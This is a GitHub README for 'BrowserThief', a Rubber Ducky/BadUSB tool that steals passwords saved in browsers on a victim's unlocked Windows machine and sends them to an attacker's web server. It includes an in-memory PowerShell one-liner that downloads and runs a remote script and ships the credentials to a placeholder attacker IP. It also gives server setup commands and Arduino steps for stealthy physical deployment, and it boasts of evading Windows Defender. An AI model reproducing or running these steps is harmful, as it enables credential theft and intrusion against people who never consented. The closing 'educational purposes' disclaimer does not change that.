# BrowserThief
Rubber Ducky/BadUSB that runs a powershell script to extract and steal browser-saved passwords and stash them at your Flask web server. 

## Features
- The powershell script can be run in-memory without writing to disk which evades Windows Defender detection
- Includes an arduino RubberDucky script that runs in less than 2 seconds

## Instructions

- Setup the web server that catches the passwords

```console
foo@bar:~$ sudo apt install docker.io
```

```console
foo@bar:~$ git clone https://github.com/ScribblerCoder/BrowserThief
```

```console
foo@bar:~$ cd BrowserThief/Web
```

```console
foo@bar:~$ sudo bash build-docker.sh
```


-  To simply run the powershell script 
```powershell
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ScribblerCoder/BrowserThief/main/BrowserThief.ps1');pumpndump -hq http://<Your-IP>:1337;exit
```
- Or you can use the rubber ducky for stealth/speed
	- Needs an Arduino that supports `<Keyboard.h>` (Nano, Leonardo)
	- Install Arduino IDE from their [website](https://wiki-content.arduino.cc/en/software)
	- Open `RubberDuckyScript.ino` using the IDE and replace `https://dump.silvercryptor.xyz` with your IP, check out [Instructions](https://github.com/ScribblerCoder/BrowserThief#Instructions) to setup the Web server
	- Compile and upload the script to the arduino
	- Insert the usb to the victim's computer (needs to be unlocked)
	- Profit 💰💰💰

## PoC





## Credits

This project wouldn't exist without the guidance of these examples 

* https://github.com/thisismyrobot/chrome-decrypt.ps1
* https://github.com/ohyicong/decrypt-chrome-passwords
* https://github.com/p0z/CPD
* https://github.com/ValterBricca/SQLite.Net-PCL
* https://github.com/ericsink/SQLitePCL.raw
* https://github.com/byt3bl33d3r/chrome-decrypter
* https://github.com/agentzex/chrome_v80_password_grabber
* https://github.com/0xfd3/Chrome-Password-Recovery 

## Disclaimer

This is for educational purposes only. I bear no responsiblity for misuses of this project